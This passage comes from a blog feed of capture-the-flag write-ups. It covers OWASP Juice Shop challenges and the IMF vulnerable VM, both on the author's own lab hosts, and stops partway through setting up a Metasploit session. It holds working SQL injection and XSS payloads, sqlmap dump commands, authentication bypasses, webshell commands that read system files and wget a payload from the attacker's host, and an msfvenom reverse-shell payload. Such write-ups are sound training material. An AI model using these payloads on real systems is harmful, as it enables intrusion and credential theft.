&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now that I have the site&#x27;s package.json file (node js package config) I can run an npm install and see if any dependencies have vulnerabilities, after running an npm install looks like sequelize and minimatch are both vulnerable because they&#x27;re using an outdate package.  Looks like another challenge solver: Inform the shop about a vulnerable library it is using.&lt;&#x2F;p&gt;
&lt;p&gt;Looking back at the score board looks like we have an item around getting back all the users&#x2F;passwords from our database, time to fire up sqlmap.  I ended up running the following command which got me back the search parameter to use:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sqlmap -u &quot;https:&#x2F;&#x2F;quiet-lake-65056.herokuapp.com&#x2F;rest&#x2F;product&#x2F;search?q=test&quot; --level=2 -p &quot;q&quot; --dbms=&quot;sqlite&quot; --dump --proxy=http:&#x2F;&#x2F;10.1.206.89:8081
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The parameters are used as follows:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;-u = URL to attack&lt;&#x2F;li&gt;
&lt;li&gt;-level = the level of attack to execute&lt;&#x2F;li&gt;
&lt;li&gt;-p = parameter to try and exploit&lt;&#x2F;li&gt;
&lt;li&gt;-dbms = the dbms we are targeting&lt;&#x2F;li&gt;
&lt;li&gt;-dump = attempt to pull the database&lt;&#x2F;li&gt;
&lt;li&gt;-proxy = the proxy to run requests through&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Once we get through things the following comes back with the following:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;sear&#x27;)) union all select null,null,null,null,null,null,null,&#x27;qzzjq&#x27;||&#x27;QHWDqQappkdzrcmfZObclJekqtZryURacjvmYOqV&#x27;||&#x27;qaakq&#x27;-- IvXq
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Plugging that into the browser we get a partial product grid.  Time to start figuring out how to get the users and password back.&lt;&#x2F;p&gt;
&lt;p&gt;I ended up with this for the final search query:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;sear&#x27;)) union all select id,email,password,null,null,null,null,&#x27;qzzjq&#x27;||&#x27;QHWDqQappkdzrcmfZObclJekqtZryURacjvmYOqV&#x27;||&#x27;qaakq&#x27; from users-- IvXq
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;A list of users and their hashed passwords, another challenge completed.&lt;&#x2F;p&gt;
&lt;p&gt;Now to try and figure out some of these passwords.  I put the hashes all into this site:
&lt;a href=&quot;https:&#x2F;&#x2F;crackstation.net&#x2F;&quot;&gt;https:&#x2F;&#x2F;crackstation.net&#x2F;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;This site was able to crack 2 of the user passwords, admin (already known) and jim.  Now to login as jim@juice-sh.op since that&#x27;s a challenge.&lt;&#x2F;p&gt;
&lt;p&gt;I used the following credentials:&lt;&#x2F;p&gt;
&lt;p&gt;User: jim@juice-sh.op
Pass: ncc-1701&lt;&#x2F;p&gt;
&lt;p&gt;Another challenge completed.&lt;&#x2F;p&gt;
&lt;p&gt;The password cracker I used identified the passwords it cracked as being md5, there is a challenge about informing the shop they&#x27;re using a library&#x2F;algorithm incorrectly so I gave it a shot and said the md5 implementation is weak, another challenge completed.&lt;&#x2F;p&gt;
&lt;p&gt;Another challenge is to give ourselves 80% or more off of an order.&lt;&#x2F;p&gt;
&lt;p&gt;Looking back at the coupon codes I found earlier it looks like it is time to figure out how those are encoded.  Maybe the package.json file from earlier will have a hint.  After seeing what several of the dependencies that we have listed are for, z85 appears to be a possibility for generating the password codes.  I downloaded the z85-cli and z85 modules from npm and ran a few coupon codes through the decoder, low and behold it decoded to the following format: MONYR-%% so I encoded JAN17-90 and got: n&amp;lt;Mibh.v3z, then checking out and using my code, another challenge completed.&lt;&#x2F;p&gt;
&lt;p&gt;Next I am looking at the file upload vulnerabilities, the first seems like a simple task in Burp.  Let&#x27;s upload a small pdf, then intercept the traffic and upload the file with a different extension.  Success, another challenge done.&lt;&#x2F;p&gt;
&lt;p&gt;The second however was a bit more tricky.  At a glance I&#x27;m guessing that the previous method with Burp is likely to be the way to go.  I started off first by just modifying my order_ from placing orders for previous challenges to get its file size a bit closer to 100kb, then messed with the file&#x27;s contents in the upload request and kept getting an error.  After taking a break and coming back to it, I only used the stream section of the file for padding size and was able to intercept the upload request, update the payload and get the challenge completed.&lt;&#x2F;p&gt;
&lt;p&gt;Now for more XSS based challenges, looks like we have 3 more outstanding, the first of which is performing a persisted XSS attack by circumventing a client-side security mechanism.  Sounds like another case where Burp will excel.&lt;&#x2F;p&gt;
&lt;p&gt;I had to try several forms first of which was the complaint form, then the contact form, and finally the user registration form.  Through this page I was able to register a user, then catch the request for submitting the user&#x27;s data and put in the required XSS (&amp;lt;script&amp;gt;alert(&amp;quot;XSS2&amp;quot;)&amp;lt;&#x2F;script&amp;gt;) payload as the user&#x27;s name, another challenge completed.&lt;&#x2F;p&gt;
&lt;p&gt;The next XSS challenge is to perform a persisted XSS attack without using the front-end at all, this seems like talking directly to the site&#x27;s API.  Watching the initial site load requests in Burp it looks like we have a rest API behind the scenes the request I saw this in was making a call to &#x2F;rest&#x2F;products, since rest uses GET&#x2F;POST&#x2F;PUT I&#x27;m thinking we can possibly store the XSS payload by doing a PUT for a given product.  I started out by simply trying: &lt;a href=&quot;https:&#x2F;&#x2F;quiet-lake-65056.herokuapp.com&#x2F;api&quot;&gt;https:&#x2F;&#x2F;quiet-lake-65056.herokuapp.com&#x2F;api&lt;&#x2F;a&gt; to access the API and get some info, which returns:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;json&quot; class=&quot;language-json &quot;&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;{&quot;status&quot;:&quot;success&quot;,&quot;data&quot;:[{&quot;name&quot;:&quot;BasketItem&quot;,&quot;tableName&quot;:&quot;BasketItems&quot;},{&quot;name&quot;:&quot;Challenge&quot;,&quot;tableName&quot;:&quot;Challenges&quot;},{&quot;name&quot;:&quot;Complaint&quot;,&quot;tableName&quot;:&quot;Complaints&quot;},{&quot;name&quot;:&quot;Feedback&quot;,&quot;tableName&quot;:&quot;Feedbacks&quot;},{&quot;name&quot;:&quot;Product&quot;,&quot;tableName&quot;:&quot;Products&quot;},{&quot;name&quot;:&quot;User&quot;,&quot;tableName&quot;:&quot;Users&quot;}]}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This looks like a map of the different server-side API calls start points.&lt;&#x2F;p&gt;
&lt;p&gt;I&#x27;m going to start by trying to perform a GET through HttpRequested (firefox plugin to make http requests).  &lt;a href=&quot;https:&#x2F;&#x2F;quiet-lake-65056.herokuapp.com&#x2F;api&#x2F;Products&#x2F;&quot;&gt;https:&#x2F;&#x2F;quiet-lake-65056.herokuapp.com&#x2F;api&#x2F;Products&#x2F;&lt;&#x2F;a&gt; was my first try, with a GET this just returns all the products in a JSON response object.&lt;&#x2F;p&gt;
&lt;p&gt;So far so good, next I tried getting a single product with this URL: &lt;a href=&quot;https:&#x2F;&#x2F;quiet-lake-65056.herokuapp.com&#x2F;api&#x2F;Products&#x2F;1&quot;&gt;https:&#x2F;&#x2F;quiet-lake-65056.herokuapp.com&#x2F;api&#x2F;Products&#x2F;1&lt;&#x2F;a&gt;, success.  Now I&#x27;m guessing we can use a PUT to update this object and persist the payload.  Looking at the JSON that comes back from the GET I built this as the payload for a PUT to update a product:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;json&quot; class=&quot;language-json &quot;&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;{&quot;description&quot;: &quot;&amp;lt;script&amp;gt;alert(\&quot;XSS3\&quot;)&amp;lt;&#x2F;script&amp;gt;&quot;}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Success&lt;&#x2F;p&gt;
&lt;p&gt;Now for the last challenge, bypassing a server-side security mechanism.  After some pondering I decided a good way to get visibility into the server-side code would be the package.json backup we retrieved in an earlier challenge.  Int he dependencies for the application there is an item called sanitize-html.  I am guessing this will be what I have to get past.  After googling the node module and looking through issues from the specific version called out in dependencies I found a security issue based on recursive application of sanitization.  Here was the item identified in the issue:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;&lt;img src=&quot;csrf-attack&quot;&#x2F;&gt;img src=&quot;csrf-attack&quot;&#x2F;&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;would translate to:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;img src=&quot;csrf-attack&quot;&#x2F;&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now to try and do that with our required XSS payload.  After some tinkering I ended up submitting this as the message in the contact form to complete the challenge:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&amp;lt;&amp;lt;script&amp;gt;alert(&quot;XSS4&quot;)&amp;lt;&#x2F;script&amp;gt;script&amp;gt;alert(&quot;XSS4&quot;)&amp;lt;&amp;lt;&#x2F;script&amp;gt;&#x2F;script&amp;gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Next challenge: Wherever you go there you are.  This was quite perplexing, I ended up googling the challenge to get some help.  It turns out the &amp;quot;fork me on github&amp;quot; link does a redirect, rather than just linking to github, seems super weird given the scenario, but anyway, I started in on this and was able to figure out that passing a URL encoded null character allowed me to redirect back to the juice shop home page (which loads all funky) then going back to the site normally I had completed the challenge.&lt;&#x2F;p&gt;
&lt;p&gt;Another challenge I have been having trouble with is the item getting the Christmas 2014 deal and buying it.  Since we know the search is vulnerable to SQL injection I started by trying to get back all products rather than the ones that are displayed on a page with this search:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;sear&#x27;)) union all select null,id,description,price,null,null,null,null from products --
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;This got me the ability to see the item and think I was adding it to my cart, but I wasn&#x27;t ever able to actually purchase the item.  After googling and watch a video from 7 minute security I had the following payload (provided by OWASP dev team):&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;christmas%25&#x27;))--
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The %25 ends up decoding to % which closes the SQL like that is being used for a keyword search, my guess here is that the UNION ALL method I tried first was not grabbing some piece of data that was required for the angular code to properly bind all its parameters on the front-end resulting in an improper add to basket.&lt;&#x2F;p&gt;
&lt;p&gt;Now to try and find the language that never got published.  This looks like a job for Burp after inspecting the URLs that are requested when picking a language it looks like each language is just a JSON file with the language code as it&#x27;s name.  I ended up googling an API language code list and built a small wordlist from the page I found, then fired Burp&#x27;s intruder at the site&#x27;s i8n with the language code as the payload placeholder so I was issuing GET requests to &lt;a href=&quot;https:&#x2F;&#x2F;quiet-lake-65056.herokuapp.com&#x2F;i18n&#x2F;placeholder.json&quot;&gt;https:&#x2F;&#x2F;quiet-lake-65056.herokuapp.com&#x2F;i18n&#x2F;placeholder.json&lt;&#x2F;a&gt; with placeholder being the wordlist items created from our googling.  I only had the free version of Burp available so it took a while, however I was able to find the missing language and complete the challenge.&lt;&#x2F;p&gt;
&lt;p&gt;After a lot of failed attempts, I ended up looking at the source (since it was available on github) and figured out the language that never made it to production was klingon -- tlh) so all my brute forcing failed based on using &amp;quot;normal&amp;quot; languages.  Either way though, challenge completed.&lt;&#x2F;p&gt;
&lt;p&gt;Logging in with Bjeorns account without using sql injection or hacking his account.&lt;&#x2F;p&gt;
&lt;p&gt;This one was pretty tough.  I had to find a walkthrough to discover that my heroku deployed app was not setup correctly.  I ended up having to configure this through both Google and in the juice shop files on my forked copy.  Once OAuth was setup though, I was now able to use the login with Google feature.&lt;&#x2F;p&gt;
&lt;p&gt;Watching requests in Burp I was able to see the requests and what was coming back to the site from a Google login, this was posted to &#x2F;api&#x2F;Users:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;json&quot; class=&quot;language-json &quot;&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;{&quot;email&quot;:&quot;m4l1c3@m4l1ce.me&quot;,&quot;password&quot;:&quot;bTRsMWMzQG00bDFjZS5tZQ==&quot;}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Looks like a base64 encoded password gets sent back from Google, which was then forwarded to &#x2F;rest&#x2F;user&#x2F;login:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;json&quot; class=&quot;language-json &quot;&gt;&lt;code class=&quot;language-json&quot; data-lang=&quot;json&quot;&gt;{&quot;email&quot;:&quot;m4l1c3@m4l1ce.me&quot;,&quot;password&quot;:&quot;bTRsMWMzQG00bDFjZS5tZQ==&quot;,&quot;oauth&quot;:true}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;After running&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;echo bTRsMWMzQG00bDFjZS5tZQ== | base64 -D m4l1c3@m4l1c3.me
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I get the email back.&lt;&#x2F;p&gt;
&lt;p&gt;Then all we have to do is base64 encode his email and get: YmpvZXJuLmtpbW1pbmljaEBnb29nbGVtYWlsLmNvbQ==&lt;&#x2F;p&gt;
&lt;p&gt;Now we are able to login as Bjeorn, another challenge completed.&lt;&#x2F;p&gt;
&lt;p&gt;Next I have been wanting to figure out the OAuth2 exploit: logging in as the CISO.  Now we are logging in as a user that we do not have a known password for.  At least there is an OAuth hint to point us in the right direction.&lt;&#x2F;p&gt;
&lt;p&gt;I messed around with this quite a bit, I know we are going to need to utilize the login with Google button, however I am not really sure what to do beyond that.  After just staring at the login page for a while, I had an idea.  What happens when the remember me button is checked while logging in as a user we have credentials for.  I tried with admin@juice-sh.op and admin123, looks like a new header is present on our HTTP requests: X-User-Email, this gets set to the email of whichever user has logged in.&lt;&#x2F;p&gt;
&lt;p&gt;Now to try and see what happens if I try and fail to login as the CISO with ciso@juice-sh.op as the user and password as the password.  Login failed, but the header did update.&lt;&#x2F;p&gt;
&lt;p&gt;After pondering some more I tried just logging in with OAuth since my browser was already authenticated to Google, which ended up actually working, the X-User-Email option being set prior to the successful OAuth login I was logged in as the CISO, challenge completed.&lt;&#x2F;p&gt;
&lt;p&gt;Now, one I had skipped quite a while ago, logging in as Bender, since we have already identified that the login page is injectable, lets try just using this as the username and escape the query:&lt;&#x2F;p&gt;
&lt;p&gt;bender@juice-sh.op&#x27;--&lt;&#x2F;p&gt;
&lt;p&gt;This ends up making the query look like:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;sql&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;SELECT * FROM USERS WHERE email=&#x27;bender@juice-sh.op&#x27;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;And this logs us in, now that we&#x27;re impersonating Bender we should change his password to get the other challenge, looking at the change password page, looks like we would need to know his password, which we do not.  Looking at the requests in Burp it makes a GET request to update the password, seems weird since data is being written, but whatever I guess.&lt;&#x2F;p&gt;
&lt;p&gt;I try a lot of different items with Burp&#x27;s repeater with no success.  Then I had the idea to just remove the current query string:&lt;&#x2F;p&gt;
&lt;p&gt;&#x2F;rest&#x2F;user&#x2F;change-password?current=%27&amp;amp;new=password&amp;amp;repeat=password&lt;&#x2F;p&gt;
&lt;p&gt;turns to:&lt;&#x2F;p&gt;
&lt;p&gt;&#x2F;rest&#x2F;user&#x2F;change-password?new=password&amp;amp;repeat=password which worked, another challenge completed.&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="en">
		<title>imf</title>
		<published>2016-11-24T00:00:00+00:00</published>
		<updated>2016-11-24T00:00:00+00:00</updated>
		<link href="https://m4l1c3.github.io/imf/" type="text/html"/>
		<id>https://m4l1c3.github.io/imf/</id>
		<content type="html">&lt;p&gt;##Finding machine on the network:&lt;&#x2F;p&gt;
&lt;p&gt;##Nmap&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap -sn 172.16.161.129&#x2F;24
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Scan for hosts on my local network which gave me a machine named &amp;quot;imf&amp;quot;&lt;&#x2F;p&gt;
&lt;p&gt;Now to run nmap on the machine itself:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;nmap -Pn -oA imf-nmap-results -p 0-65525 172.16.161.129
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Looks like port 80 is open.&lt;&#x2F;p&gt;
&lt;p&gt;After clicking through the pages on the site and viewing their sources I found this:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;!-- flag1{YWxsdGhlZmlsZXM==} --&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The first flag, having a = at the end looks base64 encoded.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;echo YWxsdGhlZmlsZXM== | base64 -d
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;returns: allthefiles&lt;&#x2F;p&gt;
&lt;p&gt;Something I noticed on the contact page was some random weird named js files:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;script src=&quot;js&#x2F;ZmxhZzJ7YVcxbVl.js&quot;&gt;&lt;&#x2F;script&gt;
&lt;script src=&quot;js&#x2F;XUnRhVzVwYzNS.js&quot;&gt;&lt;&#x2F;script&gt;
&lt;script src=&quot;js&#x2F;eVlYUnZjZz09fQ==.min.js&quot;&gt;&lt;&#x2F;script&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Those all might combine into a base64 string, lets check it out&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;echo ZmxhZzJ7YVcxbVlXUnRhVzVwYzNSeVlYUnZjZz09fQ== | base64 -D
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;which  returns: flag2{aW1mYWRtaW5pc3RyYXRvcg==}&lt;&#x2F;p&gt;
&lt;p&gt;after running:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;echo aW1mYWRtaW5pc3RyYXRvcg== | base64 -D
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I get:&lt;&#x2F;p&gt;
&lt;p&gt;imfadministrator&lt;&#x2F;p&gt;
&lt;p&gt;I tried browsing to: http:&#x2F;&#x2F;172.16.161.129&#x2F;imfadministrator&lt;&#x2F;p&gt;
&lt;p&gt;Loads up a login page, upon viewing the page source I find:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;!-- I couldn&#x27;t get the SQL working, so I hard-coded the password. It&#x27;s still mad secure through. - Roger --&gt;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I remembered seeing emails on the contact page, went page and sure enough roger is a user, rmichaels is his email.&lt;&#x2F;p&gt;
&lt;p&gt;Trying the user it seems the user is valid.&lt;&#x2F;p&gt;
&lt;p&gt;After some googling, looks like there is a potential authentication type conversion that might get us around authentication.  Looking at a post changing the type of the data that is received server side could bypass authentication.  Intercepting the HTTP post with burp and changing pass to pass[], this ends up sending an array down to the server instead of a string, improper handling of the input must be how we can get past it.  Once the post is forwarded another flag: flag3{Y29udGludWVUT2Ntcw==} which decodes to: continueTOcms&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;sqlmap --url http:&#x2F;&#x2F;172.16.161.129&#x2F;imfadministrator&#x2F;cms.php?pagename=home --threads 5 --level 5 --cookie=&quot;PHPSESSID=phpsessionid&quot; --dbms=MYSQL --dump
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Important to remember the last two parameters, I missed these originally and totally didn&#x27;t get some output for moving forward from the command line.&lt;&#x2F;p&gt;
&lt;p&gt;Another flag: flag4{dXBsb2Fkcjk0Mi5waHA=} which decodes to: uploadr942.php&lt;&#x2F;p&gt;
&lt;p&gt;flag5{YWdlbnRzZXJ2aWNlcw==} which decodes to: agentservices&lt;&#x2F;p&gt;
&lt;p&gt;Running ps -A through the webshell created to get flag5 I&#x27;m able to see all the processes running on the remote machine.  One item that loks interesting is knockd, usually this would indicate that a port knocking sequence exists to open a service up to the public.&lt;&#x2F;p&gt;
&lt;p&gt;Running: netstat -vatn shows a list of the processes listening on TCP, 7788 and 22 look interesting&lt;&#x2F;p&gt;
&lt;p&gt;Trying to knock the default ports (7000 8000 9000)&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;for x in 7000 8000 9000; do nmap -T4 -p $x 192.168.1.20;done;
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;No luck though when trying to hit the interesting ports.&lt;&#x2F;p&gt;
&lt;p&gt;Trying to hit port 7788:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;curl http:&#x2F;&#x2F;172.16.161.129&#x2F;imfadministrator&#x2F;uploads&#x2F;c59ca80d5d76.gif?c=nc localhost 7788
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;I get a little shell app. Given that we are investigating &amp;quot;agentservice&amp;quot; I do a find on agent:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;curl http:&#x2F;&#x2F;172.16.161.129&#x2F;imfadministrator&#x2F;uploads&#x2F;c59ca80d5d76.gif?c=find%20&#x2F;%20-name%20%22(asterisk)agent%22
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Which found:
&#x2F;etc&#x2F;xinetd.d&#x2F;agent&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;curl http:&#x2F;&#x2F;172.16.161.129&#x2F;imfadministrator&#x2F;uploads&#x2F;c59ca80d5d76.gif?c=cat%20&#x2F;etc&#x2F;xinetd.d&#x2F;agent
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Gets:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;nginx&quot; class=&quot;language-nginx &quot;&gt;&lt;code class=&quot;language-nginx&quot; data-lang=&quot;nginx&quot;&gt;# description: The agent server serves agent sessions
# unencrypted agentid for authentication.
service agent
{
       flags          = REUSE
       socket_type    = stream
       wait           = no
       user           = root
       server         = &#x2F;usr&#x2F;local&#x2F;bin&#x2F;agent
       log_on_failure += USERID
       disable        = no
       port           = 7788
}
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Looks like &#x2F;usr&#x2F;local&#x2F;bin&#x2F;agent is a service running.&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;curl -v http:&#x2F;&#x2F;172.16.161.1.129&#x2F;imfadministrator&#x2F;uploads&#x2F;c59ca80d5d76.gif?c=ls%20-latr%20&#x2F;usr&#x2F;local&#x2F;bin&#x2F;agent

-rwxr-xr-x 1 root root 11896 Oct 12 22:39 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;agent
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;The service runs as root, possibly a way in&lt;&#x2F;p&gt;
&lt;p&gt;In order to get a look at the binary I base64 encoded the file contents and saved it to a file locally:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;curl -v http:&#x2F;&#x2F;172.16.161.129&#x2F;imfadministrator&#x2F;uploads&#x2F;c59ca80d5d76.gif?c=base64%20-w%200%20&#x2F;usr&#x2F;local&#x2F;bin&#x2F;agent
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Then decoded it locally:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;cat agentservice | base64 -d &gt;&gt; agentservicebinary
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;and finally decompiled the binary here: https:&#x2F;&#x2F;retdec.com&#x2F;decompilation-run&#x2F;&lt;&#x2F;p&gt;
&lt;p&gt;On line 37 it looks like the value: 0x2ddd984 assigns 48093572 to an int32_t variable that is used for checking if an agent&#x27;s ID (passed into executable as a parameter is equal to 48093572), looks like a broken hard-coded authentication.&lt;&#x2F;p&gt;
&lt;p&gt;Also, I used this to convert the hex to an int:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;echo $((0x2ddd984))
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;gave me: 48093572.&lt;&#x2F;p&gt;
&lt;p&gt;Next I create a meterpreter for reverse_tcp handling using msfvenom:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfvenom -p linux&#x2F;x86&#x2F;meterpreter&#x2F;reverse_tcp LHOST=172.16.161.128 LPORT=4444 -f elf &gt; imf-meterpreter
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now we need to get the file onto the remote machine, wget is probably the easiest.&lt;&#x2F;p&gt;
&lt;p&gt;Setting up a simple web server to host the file:&lt;&#x2F;p&gt;
&lt;p&gt;python -m SimpleHTTPServer&lt;&#x2F;p&gt;
&lt;p&gt;Now run wget on the remote machine:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;curl -v http:&#x2F;&#x2F;172.16.161.129&#x2F;imfadministrator&#x2F;uploads&#x2F;c59ca80d5d76.gif?c=wget%20http:&#x2F;&#x2F;172.16.61.128:8000&#x2F;imf-meterpreter
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Make the meterpreter runnable:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;bash&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;curl -v http:&#x2F;&#x2F;172.16.161.129&#x2F;imfadministrator&#x2F;uploads&#x2F;c59ca80d5d76.gif?c=chmod%20777%20imf-meterpreter
curl -v http:&#x2F;&#x2F;172.16.161.129&#x2F;imfadministrator&#x2F;uploads&#x2F;c59ca80d5d76.gif?c=chmod%20a+x%20imf-meterpreter
&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Now we have a way to interact with the remote machine in metasploit&lt;&#x2F;p&gt;
&lt;p&gt;in MSF run:&lt;&#x2F;p&gt;
